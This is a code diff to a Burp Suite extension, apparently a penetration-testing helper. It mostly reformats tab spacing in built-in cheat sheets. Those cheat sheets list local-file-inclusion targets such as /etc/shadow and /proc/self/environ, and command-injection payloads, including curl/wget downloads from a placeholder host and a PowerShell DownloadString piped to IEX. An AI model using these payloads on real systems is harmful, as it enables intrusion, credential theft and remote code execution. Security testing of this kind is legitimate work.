@@ -914,22 +914,22 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtCheatSheetLFI = ""
         self._txtCheatSheetLFI += "Directory Traversal Linux\t\t\tDirectory Traversal Windows\n"
         self._txtCheatSheetLFI += "\t/etc/passwd\t\t\t\tC:\\boot.ini\n"
-        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\t\tC:\\windows\\win.ini\n"
-        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\t\tC:\\windows\\system.ini\n"
-        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\t\tC:\\windows\\system32\\notepad.exe\n"
-        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
+        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\tC:\\windows\\win.ini\n"
+        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\tC:\\windows\\system.ini\n"
+        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\tC:\\windows\\system32\\notepad.exe\n"
+        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
         self._txtCheatSheetLFI += "\t/etc/shadow\t\t\t\tC:\\windows\\system32\\license.rtf\n"
-        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
-        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\t\tC:\\windows\\system32\\eula.txt\n"
+        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
+        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\tC:\\windows\\system32\\eula.txt\n"
         
         self._txtCheatSheetCommandInj = ""
-        self._txtCheatSheetCommandInj += "Command Inj Unix\t\t\t\t\tCommand Inj Windows\n"
-        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\t\ttype file.txt\n"
-        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\t\tsysteminfo\n"
-        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\t\twhoami /priv\n"
-        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\t\tping -n 10 X.X.X.X\n"
+        self._txtCheatSheetCommandInj += "Command Inj Unix\t\t\t\tCommand Inj Windows\n"
+        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\ttype file.txt\n"
+        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\tsysteminfo\n"
+        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\twhoami /priv\n"
+        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
         self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
-        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
+        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         _lblDepth.setToolTipText("Generate payloads only for some certain folder depth.")
         _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
@@ -1044,7 +1044,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         
         #bottom panel 
         self._tabDictResultDisplay = JTextPane()
-        self._tabDictResultDisplay.setFont(self._tabDictResultDisplay.getFont().deriveFont(Font.PLAIN, 14))
+        #self._tabDictResultDisplay.setFont(self._tabDictResultDisplay.getFont().deriveFont(Font.PLAIN, self._tabDictResultDisplay.getFont().getSize() + 4))
         self._tabDictResultDisplay.setContentType("text")
         self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
         self._tabDictResultDisplay.setEditable(False)
